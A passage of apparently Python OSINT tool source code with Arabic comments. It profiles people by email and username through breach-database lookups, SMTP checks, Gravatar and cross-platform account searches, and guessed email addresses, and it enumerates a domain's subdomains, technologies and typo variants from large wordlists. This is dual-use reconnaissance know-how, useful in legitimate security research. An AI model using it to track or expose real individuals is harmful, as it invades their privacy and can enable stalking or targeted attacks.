                    'message': item.get('commit', {}).get('message', '')[:100],
                    'url': item.get('html_url', 'N/A')
                })
    except: pass
    
    return results


def get_email_social_profiles(email: str) -> Dict:
    """البحث عن ملفات التواصل الاجتماعي المرتبطة بالبريد"""
    profiles = {'platforms': []}
    
    username = email.split('@')[0]
    domain = email.split('@')[1]
    
    social_urls = {
        'Facebook': f"https://www.facebook.com/search/top?q={email}",
        'Twitter': f"https://twitter.com/search?q={email}",
        'LinkedIn': f"https://www.linkedin.com/search/results/people/?keywords={email}",
        'Instagram': f"https://www.instagram.com/accounts/emailsignup/?email={email}",
        'GitHub': f"https://github.com/search?q={email}&type=users",
        'Pinterest': f"https://www.pinterest.com/search/pins/?q={email}",
        'Reddit': f"https://www.reddit.com/search/?q={email}",
        'Medium': f"https://medium.com/search?q={email}",
        'Quora': f"https://www.quora.com/search?q={email}",
        'Tumblr': f"https://www.tumblr.com/search/{email}",
        'WordPress': f"https://wordpress.com/search/{email}",
        'Gravatar': f"https://www.gravatar.com/{hashlib.md5(email.lower().encode()).hexdigest()}"
    }
    
    for platform, url in social_urls.items():
        profiles['platforms'].append({'name': platform, 'url': url})
    
    return profiles


def display_email_summary(email: str, data: Dict):
    """عرض ملخص البريد في التيرمينال"""
    print(f"\n {Wh}{'='*50}")
    print(f" {Gr} EMAIL INVESTIGATION SUMMARY")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} Email           : {Gr}{email}")
    print(f"{Wh} Domain          : {Gr}{email.split('@')[1]}")
    print(f"{Wh} Username        : {Gr}{email.split('@')[0]}")
    print(f"{Wh} MD5 Hash        : {Gr}{hashlib.md5(email.lower().encode()).hexdigest()}")
    breach_count = data.get('Breaches', {}).get('total_breaches', 0)
    if breach_count > 0:
        print(f"{R} Breaches        : Found in {breach_count} breaches{R}")
    else:
        print(f"{Wh} Breaches        : {Gr}None found")
    print(f"{Wh} SMTP Valid      : {Gr}{data.get('SMTP_Check', {}).get('valid', 'N/A')}")
    if data.get('GitHub', {}).get('repos'):
        print(f"{Wh} GitHub Ref      : {Gr}{len(data['GitHub']['repos'])} references")

def email_osint():
    email = input(f"\n{Wh}[?] Enter email address {Gr}[e.g., user@example.com]{Wh}: {Gr}").strip()
    if not email or '@' not in email:
        print(f"{R}[!] Invalid email address!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} EMAIL OSINT INVESTIGATION (ENHANCED)")
    print(f" {Wh}{'='*50}")
    
    domain = email.split('@')[1]
    username = email.split('@')[0]
    email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
    
    data = {
        "Email": email,
        "Username": username,
        "Domain": domain,
        "MD5 Hash": email_hash,
        "SHA1 Hash": hashlib.sha1(email.lower().strip().encode()).hexdigest(),
    }
    
    print(f"{Wh} Username       : {Gr}{username}")
    print(f"{Wh} Domain         : {Gr}{domain}")
    print(f"{Wh} MD5 Hash       : {Gr}{email_hash}")
    
    print(f"\n{Y}[*] Checking advanced breach databases...{Wh}")
    breaches = check_email_breaches_advanced(email)
    if breaches['total_breaches'] > 0:
        print(f"{R}[!] Email found in {breaches['total_breaches']} data breaches!{Wh}")
        for breach in breaches['breaches'][:5]:
            print(f"    {R}- {breach.get('Name', 'Unknown')} ({breach.get('BreachDate', 'Unknown date')}){Wh}")
        data['Breaches'] = breaches
    else:
        print(f"{Gr}[+] No breaches found{Wh}")
    
    print(f"\n{Y}[*] SMTP verification...{Wh}")
    smtp_check = verify_email_smtp_advanced(email)
    if smtp_check.get('valid'):
        print(f"{Gr}[+] Email appears valid (SMTP check passed){Wh}")
    else:
        print(f"{Y}[?] SMTP verification: {smtp_check.get('reason', 'Could not verify')}{Wh}")
    data['SMTP_Check'] = smtp_check
    
    print(f"\n{Y}[*] Searching GitHub for email references...{Wh}")
    github_results = search_email_on_github_advanced(email)
    if github_results['repos']:
        print(f"{Gr}[+] Found {len(github_results['repos'])} references on GitHub{Wh}")
        for repo in github_results['repos'][:3]:
            print(f"    {Wh}- {repo['repo']}: {C}{repo['url'][:60]}{RS}")
        data['GitHub'] = github_results
    
    print(f"\n{Y}[*] Gravatar profile check...{Wh}")
    try:
        gravatar_url = f"https://www.gravatar.com/{email_hash}.json"
        gravatar_resp = requests.get(gravatar_url, timeout=5)
        if gravatar_resp.status_code == 200:
            grav_data = gravatar_resp.json()
            entries = grav_data.get("entry", [])
            if entries:
                profile = entries[0]
                print(f"{Gr}[+] Gravatar profile found!{Wh}")
                if profile.get('displayName'):
                    print(f"    {Wh}Name: {Gr}{profile['displayName']}{Wh}")
                if profile.get('currentLocation'):
                    print(f"    {Wh}Location: {Gr}{profile['currentLocation']}{Wh}")
                if profile.get('aboutMe'):
                    print(f"    {Wh}Bio: {Gr}{profile['aboutMe'][:100]}{Wh}")
                data['Gravatar'] = profile
        else:
            print(f"{Y}[-] No Gravatar profile found{Wh}")
    except:
        print(f"{Y}[?] Could not check Gravatar{Wh}")
    
    display_email_summary(email, data)
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="email",
        target=email,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")


EXTRA_PLATFORMS = [
    {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
    {"url": "https://www.threads.net/@{}", "name": "Threads"},
    {"url": "https://bsky.app/profile/{}", "name": "Bluesky"},
    {"url": "https://mastodon.social/@{}", "name": "Mastodon"},
    {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
    {"url": "https://kick.com/{}", "name": "Kick"},
    {"url": "https://www.psnprofiles.com/{}", "name": "PlayStation"},
    {"url": "https://steamcommunity.com/id/{}", "name": "Steam"},
    {"url": "https://account.xbox.com/en-us/Profile?gamerTag={}", "name": "Xbox"},
    {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
    {"url": "https://news.ycombinator.com/user?id={}", "name": "HackerNews"},
    {"url": "https://www.producthunt.com/@{}", "name": "ProductHunt"},
    {"url": "https://dev.to/{}", "name": "DevTo"},
    {"url": "https://hashnode.com/@{}", "name": "Hashnode"},
    {"url": "https://medium.com/@{}", "name": "Medium"},
    {"url": "https://substack.com/@{}", "name": "Substack"},
    {"url": "https://open.spotify.com/user/{}", "name": "Spotify"},
    {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
    {"url": "https://bandcamp.com/{}", "name": "Bandcamp"},
    {"url": "https://www.last.fm/user/{}", "name": "LastFM"},
    {"url": "https://www.mixcloud.com/{}/", "name": "Mixcloud"},
    {"url": "https://www.deviantart.com/{}", "name": "DeviantArt"},
    {"url": "https://www.artstation.com/{}", "name": "ArtStation"},
    {"url": "https://www.behance.net/{}", "name": "Behance"},
    {"url": "https://dribbble.com/{}", "name": "Dribbble"},
    {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
    {"url": "https://500px.com/{}", "name": "500px"},
    {"url": "https://unsplash.com/@{}", "name": "Unsplash"},
    {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
    {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
    {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
    {"url": "https://stackoverflow.com/users/{}", "name": "StackOverflow"},
    {"url": "https://github.com/{}", "name": "GitHub"},
    {"url": "https://gitlab.com/{}", "name": "GitLab"},
    {"url": "https://bitbucket.org/{}/", "name": "Bitbucket"},
    {"url": "https://www.hackerrank.com/{}", "name": "HackerRank"},
    {"url": "https://leetcode.com/{}", "name": "LeetCode"},
    {"url": "https://www.codewars.com/users/{}", "name": "CodeWars"},
    {"url": "https://tryhackme.com/p/{}", "name": "TryHackMe"},
    {"url": "https://app.hackthebox.com/users/{}", "name": "HackTheBox"},
    {"url": "https://www.buymeacoffee.com/{}", "name": "BuyMeACoffee"},
    {"url": "https://ko-fi.com/{}", "name": "KoFi"},
    {"url": "https://www.patreon.com/{}", "name": "Patreon"},
    {"url": "https://keybase.io/{}", "name": "Keybase"},
    {"url": "https://about.me/{}", "name": "AboutMe"},
    {"url": "https://linktr.ee/{}", "name": "Linktree"},
    {"url": "https://carrd.co/{}", "name": "Carrd"},
    {"url": "https://www.replit.com/@{}", "name": "Replit"},
    {"url": "https://codepen.io/{}", "name": "CodePen"},
    {"url": "https://jsfiddle.net/user/{}", "name": "JSFiddle"},
    {"url": "https://codesandbox.io/u/{}", "name": "CodeSandbox"},
    {"url": "https://glitch.com/@{}", "name": "Glitch"},
    {"url": "https://vercel.com/{}", "name": "Vercel"},
    {"url": "https://netlify.com/{}", "name": "Netlify"},
    {"url": "https://wordpress.com/{}", "name": "WordPress"},
    {"url": "https://wix.com/{}", "name": "Wix"},
    {"url": "https://www.fiverr.com/{}", "name": "Fiverr"},
    {"url": "https://www.upwork.com/freelancers/~01{}", "name": "Upwork"},
    {"url": "https://www.freelancer.com/u/{}", "name": "Freelancer"},
]


def search_username_advanced(username: str) -> Dict:
    """بحث متقدم عن username مع معلومات إضافية"""
    results = {'found': [], 'possible_emails': [], 'similar_usernames': []}
    
    common_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com', 'icloud.com']
    for domain in common_domains:
        results['possible_emails'].append(f"{username}@{domain}")
    
    variations = [
        username,
        username.lower(),
        username.upper(),
        username.capitalize(),
        username + '123',
        username + '_',
        '_' + username,
        username + '01',
        username.replace('.', ''),
        username.replace('_', ''),
        username.replace('-', ''),
    ]
    results['similar_usernames'] = list(set(variations))[:10]
    
    return results


def check_username_breaches(username: str) -> Dict:
    """التحقق من تسريب username"""
    breaches = {'found': False, 'sources': []}
    
    try:
        resp = requests.get(f"https://leak-lookup.com/api/search?username={username}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                breaches['found'] = True
                breaches['sources'] = list(data.get('data', {}).keys())[:10]
    except: pass
    
    return breaches


def get_username_avatar(username: str, platform: str) -> str:
    """محاولة الحصول على صورة البروفايل"""
    avatar_urls = {
        'GitHub': f"https://github.com/{username}.png",
        'GitLab': f"https://gitlab.com/uploads/user/avatar/{username}.png",
        'Gravatar': f"https://www.gravatar.com/avatar/{hashlib.md5(username.lower().encode()).hexdigest()}?d=404",
    }
    return avatar_urls.get(platform, '')


def TrackLu_Enhanced(username=None):
    if not username:
        username = input(f"\n{Wh}[?] Enter username to track {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
    if not username:
        print(f"{R}[!] Username cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    all_platforms = [
        {"url": "https://www.facebook.com/{}", "name": "Facebook"},
        {"url": "https://x.com/{}", "name": "Twitter/X"},
        {"url": "https://www.instagram.com/{}", "name": "Instagram"},
        {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
        {"url": "https://www.github.com/{}", "name": "GitHub"},
        {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
        {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
        {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
        {"url": "https://t.me/{}", "name": "Telegram"},
        {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
        {"url": "https://medium.com/@{}", "name": "Medium"},
        {"url": "https://dev.to/{}", "name": "DevTo"},
        {"url": "https://hashnode.com/@{}", "name": "Hashnode"},
        {"url": "https://about.me/{}", "name": "AboutMe"},
        {"url": "https://www.replit.com/@{}", "name": "Replit"},
        {"url": "https://codepen.io/{}", "name": "CodePen"},
        {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
        {"url": "https://www.youtube.com/@{}", "name": "YouTube"},
        {"url": "https://open.spotify.com/user/{}", "name": "Spotify"},
        {"url": "https://www.patreon.com/{}", "name": "Patreon"},
        {"url": "https://keybase.io/{}", "name": "Keybase"},
        {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
        {"url": "https://dribbble.com/{}", "name": "Dribbble"},
        {"url": "https://www.behance.net/{}", "name": "Behance"},
        {"url": "https://mastodon.social/@{}", "name": "Mastodon"},
        {"url": "https://www.producthunt.com/@{}", "name": "ProductHunt"},
        {"url": "https://www.buymeacoffee.com/{}", "name": "BuyMeACoffee"},
        {"url": "https://www.threads.net/@{}", "name": "Threads"},
        {"url": "https://bsky.app/profile/{}", "name": "Bluesky"},
        {"url": "https://kick.com/{}", "name": "Kick"},
        {"url": "https://steamcommunity.com/id/{}", "name": "Steam"},
        {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
        {"url": "https://www.wattpad.com/user/{}", "name": "Wattpad"},
        {"url": "https://vk.com/{}", "name": "VK"},
        {"url": "https://www.mixcloud.com/{}/", "name": "Mixcloud"},
        {"url": "https://tryhackme.com/p/{}", "name": "TryHackMe"},
        {"url": "https://news.ycombinator.com/user?id={}", "name": "HackerNews"},
        {"url": "https://gitlab.com/{}", "name": "GitLab"},
        {"url": "https://bitbucket.org/{}/", "name": "Bitbucket"},
        {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
        {"url": "https://leetcode.com/{}", "name": "LeetCode"},
        {"url": "https://www.codewars.com/users/{}", "name": "CodeWars"},
        {"url": "https://app.hackthebox.com/users/{}", "name": "HackTheBox"},
        {"url": "https://ko-fi.com/{}", "name": "KoFi"},
        {"url": "https://linktr.ee/{}", "name": "Linktree"},
        {"url": "https://carrd.co/{}", "name": "Carrd"},
        {"url": "https://www.fiverr.com/{}", "name": "Fiverr"},
    ]
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} RATED USERNAME TRACKING (0-100)")
    print(f" {Wh}{'='*50}")
    print(f"{Y}[*] Searching {len(all_platforms)} platforms with confidence scoring...")
    print(f"{Y}[*] Score legend: 85+ VERY HIGH | 70+ HIGH | 45+ MEDIUM | 20+ LOW | <20 NONE{Wh}")
    
    results = {}
    session = get_session()
    found_count = 0
    
    with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
        futures = {executor.submit(check_platform_rated, site, username, session): site for site in all_platforms}
        
        for i, future in enumerate(as_completed(futures), 1):
            platform, result = future.result()
            results[platform] = result
            if result.get("status") == "found":
                found_count += 1
            
            if i % 20 == 0:
                progress = int((i / len(all_platforms)) * 100)
                print(f"\r{Y}[*] Progress: {progress}% | Found: {found_count}", end="", flush=True)
    
    print(f"\n\n {Wh}{'='*50}")
    print(f" {R} RESULTS WITH CONFIDENCE SCORES")
    print(f" {Wh}{'='*50}")
    
    scored_results = []
    for platform, data in results.items():
        if data.get("status") == "found":
            score = data.get("score", 0)
            conf = data.get("confidence", "LOW")
            scored_results.append((score, platform, data))
    
    scored_results.sort(reverse=True)
    
    if scored_results:
        print(f"\n{Gr}[+] FOUND PROFILES ({found_count}) - Sorted by confidence:{Wh}")
        print(f"\n{Wh} {'='*65}")
        print(f" {Wh}Score  Confidence     Platform              URL")
        print(f"{Wh} {'='*65}")
        
        for score, platform, data in scored_results:
            conf = data.get("confidence", "")
            color = Gr if score >= 70 else (C if score >= 45 else Y)
            print(f" {color}{score:3}/100 {conf:<12} {Gr}{platform:<20} {C}{data.get('url', '')[:50]}{RS}")
        
        print(f"{Wh} {'='*65}")
        
        not_found_count = sum(1 for d in results.values() if d.get("status") == "not_found")
        error_count = sum(1 for d in results.values() if d.get("status") == "error")
        
        avg_score = sum(d.get("score", 0) for d in results.values() if d.get("status") == "found") / max(found_count, 1)
        print(f"\n{Wh}[*] Summary: {Gr}{found_count} found{Wh} (avg score: {avg_score:.0f}/100) | {Y}{not_found_count} not found{Wh} | {R}{error_count} errors{Wh}")
        
        print(f"\n{Y}[*] Generating intelligence...{Wh}")
        advanced = search_username_advanced(username)
        if advanced.get('possible_emails'):
            print(f"{Wh}[*] Possible associated emails:{Wh}")
            for email in advanced['possible_emails'][:5]:
                print(f"    {C}{email}{RS}")
            results['_advanced'] = advanced
        
        breaches = check_username_breaches(username)
        if breaches.get('found'):
            print(f"{R}[!] Username found in data breaches!{Wh}")
            results['_breaches'] = breaches
    else:
        print(f"{Y}[!] No profiles found for '{username}' on any platform{Wh}")
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="username",
        target=username,
        data=results
    )
    save_report(result, ["json", "txt", "csv"])
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")


def TrackLu_Super(username=None):
    if not username:
        username = input(f"\n{Wh}[?] Enter username {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
    if not username:
        print(f"{R}[!] Username cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter")
        return

    print(f"\n{Y}[*] Initializing WhatsMyName Super Engine...{Wh}")
    engine = WhatsMyNameEngine()
    stats = engine.get_stats()
    print(f"{Gr}[+] Loaded {stats['total_sites']} sites across {len(stats['categories'])} categories{Wh}")
    print(f"{Gr}[+] POST support: {stats['has_post_support']} sites | Protected: {stats['has_protection']}{Wh}")

    print(f"\n{Y}[*] Filter options:{Wh}")
    print(f"  1. All sites ({stats['total_sites']})")
    print(f"  2. Social media only")
    print(f"  3. Coding/tech sites")
    print(f"  4. Custom filter")

    choice = input(f"\n{Wh}[?] Choose filter {Gr}[1-4]{Wh}: {Gr}").strip()
    categories = None
    if choice == "2":
        categories = ["social"]
    elif choice == "3":
        categories = ["coding", "tech"]
    elif choice == "4":
        all_cats = engine.get_categories()
        print(f"\n{Y}Available categories: {', '.join(all_cats)}{Wh}")
        cat_input = input(f"{Wh}[?] Enter categories (comma separated): {Gr}").strip()
        categories = [c.strip() for c in cat_input.split(",") if c.strip()]

    print(f"\n{Y}[*] Searching '{username}' across {stats['total_sites']} sites...{Wh}")
    print(f"{Y}[*] This may take a moment...{Wh}\n")

    results = engine.search(username, categories=categories)

    print(f"\n {Wh}{'='*55}")
    print(f" {R}WHATSMYNAME SUPER RESULTS")
    print(f" {Wh}{'='*55}")

    print(f"\n{Gr}[+] FOUND ({len(results['found'])} sites):{Wh}")
    for site in results['found'][:35]:
        print(f"    {Wh} {C}{site['name']:<25}{RS} → {Gr}{site['url'][:60]}{RS}")
    if len(results['found']) > 35:
        print(f"    {Y}... and {len(results['found']) - 35} more")

    if results['not_found']:
        print(f"\n{Y}[-] NOT FOUND ({len(results['not_found'])} sites):{Wh}")
        for site in results['not_found'][:10]:
            print(f"    {Wh}• {site['name']:<25} → HTTP {site['status_code']}{RS}")

    print(f"\n{Wh}[*] Summary: Found {len(results['found'])} / {results['total']} sites{RS}")

    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="wmn_super",
        target=username,
        data=results
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter")


def get_domain_technologies(domain: str) -> Dict:
    """اكتشاف التقنيات المستخدمة في الموقع"""
    tech = {'frameworks': [], 'analytics': [], 'cdn': [], 'servers': []}
    
    try:
        resp = requests.get(f"https://{domain}", timeout=10, headers={'User-Agent': random.choice(CONFIG["user_agents"])})
        headers = resp.headers
        body = resp.text.lower()
        
        if 'Server' in headers:
            tech['servers'].append(headers['Server'])
        
        if 'CF-RAY' in headers:
            tech['cdn'].append('Cloudflare')
        if 'x-amz-cf-id' in headers:
            tech['cdn'].append('AWS CloudFront')
        if 'X-Sucuri-ID' in headers:
            tech['cdn'].append('Sucuri')
        
        if 'gtag' in body or 'google-analytics' in body:
            tech['analytics'].append('Google Analytics')
        if 'facebook.com/tr' in body:
            tech['analytics'].append('Facebook Pixel')
        
        if 'react' in body:
            tech['frameworks'].append('React')
        if 'vue' in body:
            tech['frameworks'].append('Vue.js')
        if 'angular' in body:
            tech['frameworks'].append('Angular')
        if 'jquery' in body:
            tech['frameworks'].append('jQuery')
        if 'wordpress' in body:
            tech['frameworks'].append('WordPress')
        if 'drupal' in body:
            tech['frameworks'].append('Drupal')
        if 'joomla' in body:
            tech['frameworks'].append('Joomla')
        if 'laravel' in body:
            tech['frameworks'].append('Laravel')
    except: pass
    
    return tech


def get_subdomains_crt(domain: str, max_results: int = 50) -> List[str]:
    """الحصول على subdomains من CRT.sh"""
    subdomains = set()
    try:
        resp = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        if resp.status_code == 200:
            certs = resp.json()
            if isinstance(certs, list):
                for cert in certs:
                    name = cert.get('name_value', '')
                    if name:
                        for sub in name.split('\n'):
                            sub = sub.strip().lower()
                            if sub.endswith(domain) and sub != domain:
                                subdomains.add(sub)
    except: pass
    
    return list(subdomains)[:max_results]


def get_domain_related(domain: str) -> Dict:
    """الحصول على نطاقات مرتبطة"""
    related = {'same_ip': [], 'same_registrar': [], 'similar': []}
    
    base = domain.split('.')[0]
    tld = '.'.join(domain.split('.')[1:])
    
    typos = [
        base.replace('o', '0'), base.replace('i', '1'), base.replace('e', '3'),
        base + 's', base + 'online', base + 'app',
        'the' + base, base + 'official', 'www' + base
    ]
    
    for typo in typos[:10]:
        related['similar'].append(f"{typo}.{tld}")
    
    return related


# ── DNSRecon-Powered DNS Enumeration Engine ──────────────────────────

SUBDOMAIN_WORDLIST = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop3', 'admin', 'blog', 'vpn',
    'api', 'dev', 'test', 'stage', 'staging', 'prod', 'production', 'uat', 'demo', 'beta',
    'ns1', 'ns2', 'ns3', 'ns4', 'mx', 'mx1', 'mx2', 'mail2', 'mail3', 'imap',
    'autodiscover', 'cpanel', 'whm', 'webdisk', 'cpcalendars', 'cpcontacts', 'webmail',
    'server', 'remote', 'secure', 'portal', 'my', 'support', 'help', 'status', 'docs',
    'wiki', 'git', 'svn', 'jenkins', 'jira', 'confluence', 'grafana', 'prometheus',
    'kibana', 'elastic', 'logstash', 'splunk', 'nagios', 'zabbix', 'monitor', 'monitoring',
    'cloud', 'cdn', 'static', 'assets', 'media', 'img', 'images', 'css', 'js', 'fonts',
    'download', 'downloads', 'upload', 'uploads', 'files', 'file', 'storage', 'backup',
    'proxy', 'cache', 'balancer', 'lb', 'loadbalancer', 'gw', 'gateway', 'router', 'fw',
    'firewall', 'waf', 'ids', 'ips', 'siem', 'soc', 'honeypot', 'sinkhole', 'dns', 'dhcp',
    'ntp', 'syslog', 'snmp', 'radius', 'ldap', 'kerberos', 'ad', 'dc', 'domaincontroller',
    'owa', 'exchange', 'ecp', 'ews', 'mapi', 'rpc', 'activesync', 'caldav', 'carddav',
    'lync', 'sfb', 'teams', 'zoom', 'meet', 'webex', 'gotomeeting', 'anyconnect', 'vpn',
    'openvpn', 'ipsec', 'pptp', 'l2tp', 'sstp', 'ikev2', 'wireguard', 'ssh', 'rdp', 'vnc',
    'telnet', 'bastion', 'jump', 'jumpbox', 'cacti', 'mrtg', 'observium', 'librenms',
    'pve', 'proxmox', 'esxi', 'vcenter', 'vsphere', 'vcloud', 'xen', 'xenserver', 'kvm',
    'docker', 'k8s', 'kubernetes', 'rancher', 'openshift', 'nomad', 'consul', 'vault',
    'nexus', 'artifactory', 'registry', 'harbor', 'gitlab', 'bitbucket', 'gitea', 'gogs',
    'grafana', 'kibana', 'logstash', 'graylog', 'papertrail', 'loggly', 'sumologic',
    'sentry', 'rollbar', 'bugsnag', 'datadog', 'newrelic', 'appdynamics', 'dynatrace',
    'pagerduty', 'opsgenie', 'victorops', 'slack', 'teams', 'discord', 'mattermost',
    'rocketchat', 'zulip', 'riot', 'matrix', 'jitsi', 'bigbluebutton', 'openmeetings',
    'moodle', 'blackboard', 'canvas', 'edmodo', 'schoology', 'classroom', 'academy',
    'learn', 'training', 'tutorial', 'course', 'courses', 'university', 'campus',
    'research', 'lab', 'labs', 'science', 'tech', 'technology', 'innovation', 'rnd',
    'hr', 'humanresources', 'payroll', 'benefits', 'talent', 'recruitment', 'jobs',
    'career', 'careers', 'apply', 'resume', 'cv', 'interview', 'onboarding',
    'erp', 'crm', 'sales', 'marketing', 'analytics', 'reports', 'reporting', 'bi',
    'tableau', 'powerbi', 'qlik', 'looker', 'microstrategy', 'cognos', 'businessobjects',
    'sap', 'oracle', 'peoplesoft', 'jdedwards', 'siebel', 'salesforce', 'dynamics',
    'hubspot', 'market', 'mailchimp', 'sendgrid', 'mandrill', 'postmark', 'ses',
    'wordpress', 'wp', 'wp-admin', 'wp-content', 'wp-includes', 'wp-login', 'wp-json',
    'joomla', 'drupal', 'magento', 'shopify', 'woocommerce', 'prestashop', 'opencart',
    'phpmyadmin', 'phpadmin', 'adminer', 'pgadmin', 'sqlpad', 'titan', 'couchdb',
    'mariadb', 'mysql', 'postgres', 'redis', 'memcached', 'mongodb', 'elasticsearch',
    'solr', 'sphinx', 'neo4j', 'cassandra', 'couchbase', 'riak', 'cockroachdb',
    'stream', 'live', 'tv', 'video', 'radio', 'podcast', 'channel', 'media', 'broadcast',
    'shop', 'store', 'marketplace', 'cart', 'checkout', 'order', 'orders', 'payment',
    'billing', 'invoice', 'invoices', 'subscription', 'subscribe', 'newsletter',
    'news', 'blog', 'articles', 'article', 'post', 'posts', 'forum', 'community',
    'chat', 'talk', 'message', 'messages', 'notification', 'notifications', 'alert',
    'alerts', 'webhook', 'webhooks', 'callback', 'callback', 'endpoint', 'endpoints',
    'mobile', 'app', 'apps', 'android', 'ios', 'iphone', 'ipad', 'mac', 'windows',
    'linux', 'ubuntu', 'debian', 'centos', 'redhat', 'fedora', 'arch', 'alpine',
    's3', 'bucket', 'objects', 'files', 'static', 'assets', 'media', 'uploads',
    'test', 'tests', 'testing', 'qa', 'quality', 'qualityassurance', 'ci', 'cd',
    'teamcity', 'bamboo', 'circleci', 'travis', 'github', 'gitlab-ci', 'jenkins',
    'build', 'builder', 'compile', 'compiler', 'package', 'packages', 'repo', 'repository',
    'npm', 'pypi', 'rubygems', 'crates', 'packagist', 'nuget', 'dockerhub', 'quay',
    'registry', 'artifactory', 'nexus', 'proget', 'chocolatey', 'homebrew',
    'zone', 'internal', 'external', 'dmz', 'intranet', 'extranet', 'partner', 'partners',
    'vendor', 'vendors', 'supplier', 'suppliers', 'customer', 'customers', 'client',
    'clients', 'tenant', 'tenants', 'admin', 'administrator', 'root', 'superuser',
    'manager', 'management', 'dashboard', 'control', 'panel', 'console',
]

SRV_SERVICES = [
    '_sip._tcp', '_sip._udp', '_sips._tcp',
    '_h323cs._tcp', '_h323cs._udp', '_h323ls._tcp', '_h323ls._udp',
    '_sipinternal._tcp', '_sipinternaltls._tcp',
    '_sipfederationtls._tcp', '_sipfederation._tcp',
    '_stun._tcp', '_stun._udp', '_stuns._tcp', '_stuns._udp',
    '_turn._tcp', '_turn._udp', '_turns._tcp', '_turns._udp',
    '_ldap._tcp', '_ldap._udp', '_ldaps._tcp',
    '_kerberos._tcp', '_kerberos._udp', '_kerberos-master._tcp', '_kerberos-master._udp',
    '_kpasswd._tcp', '_kpasswd._udp',
    '_http._tcp', '_https._tcp',
    '_imap._tcp', '_imaps._tcp', '_pop3._tcp', '_pop3s._tcp', '_smtp._tcp', '_smtps._tcp',
    '_submission._tcp', '_submissions._tcp',
    '_caldav._tcp', '_caldavs._tcp', '_carddav._tcp', '_carddavs._tcp',
    '_xconference._tcp', '_xconference._udp',
    '_xmpp-client._tcp', '_xmpp-server._tcp',
    '_jabber._tcp, _jabber._udp',
    '_puppet._tcp', '_puppetca._tcp',
    '_autodiscover._tcp',
    '_msdcs._tcp', '_gc._tcp', '_kerberos._tcp.dc._msdcs',
    '_vlmcs._tcp', '_vlmcs._udp',
    '_minecraft._tcp', '_minecraft._udp',
    '_ts3._udp', '_teamspeak._udp', '_mumble._udp',
    '_ssh._tcp', '_rdp._tcp', '_vnc._tcp',
    '_sftp._tcp', '_ftp._tcp',
    '_mysql._tcp', '_postgresql._tcp', '_mongodb._tcp', '_redis._tcp',
    '_docker._tcp', '_docker-swarm._tcp',
    '_etcd._tcp', '_etcd-client._tcp',
    '_consul._tcp', '_consul._udp',
    '_vault._tcp',
    '_nrpe._tcp', '_nagios._tcp',
    '_snmp._udp', '_trap._udp',
    '_syslog._udp', '_syslog-tls._tcp',
]

COMMON_TLDS = [
    'com', 'net', 'org', 'io', 'co', 'app', 'dev', 'me', 'xyz', 'info',
    'cloud', 'online', 'site', 'tech', 'store', 'blog', 'live', 'pro', 'top', 'vip',
    'ai', 'digital', 'network', 'world', 'life', 'media', 'social', 'news', 'email',
    'agency', 'center', 'global', 'group', 'guru', 'host', 'international', 'link',
    'ltd', 'one', 'press', 'pub', 'rocks', 'solutions', 'support', 'today', 'video',
    'web', 'work', 'zone', 'biz', 'name', 'xyz', 'club', 'design', 'exchange', 'express',
    'finance', 'fund', 'gold', 'green', 'health', 'help', 'hosting', 'info', 'institute',
    'investments', 'love', 'market', 'mba', 'media', 'mobile', 'money', 'network',
    'page', 'partners', 'photo', 'photography', 'photos', 'pics', 'pictures',
    'plus', 'press', 'productions', 'properties', 'protection', 'racing', 'realty',
    'recipes', 'red', 'reisen', 'rent', 'rentals', 'repair', 'report', 'republican',
    'restaurant', 'review', 'reviews', 'rip', 'rocks', 'rodeo', 'run', 'sale', 'salon',
    'sarl', 'school', 'schule', 'science', 'scot', 'security', 'services', 'sex',
    'sexy', 'shiksha', 'shoes', 'show', 'shopping', 'shops', 'site', 'ski', 'solar',
    'solutions', 'space', 'studio', 'style', 'sucks', 'supplies', 'supply', 'support',
    'surf', 'surgery', 'systems', 'tattoo', 'tax', 'taxi', 'team', 'technology',
    'tennis', 'theater', 'theatre', 'tips', 'tires', 'today', 'tools', 'tours',
    'town', 'toys', 'trade', 'training', 'travel', 'tube', 'university', 'uno',
    'vacations', 'ventures', 'versicherung', 'vet', 'viajes', 'video', 'villas',
    'vision', 'voyage', 'wang', 'watch', 'webcam', 'website', 'wedding', 'wiki',
    'works', 'world', 'wtf', 'xxx', 'xyz', 'yoga', 'zone'
]


class DnsReconEngine:
    """DNSRecon-powered advanced DNS enumeration engine"""

    def __init__(self, domain, nameserver=None, timeout=5, tcp=False):
        self.domain = domain.rstrip('.')
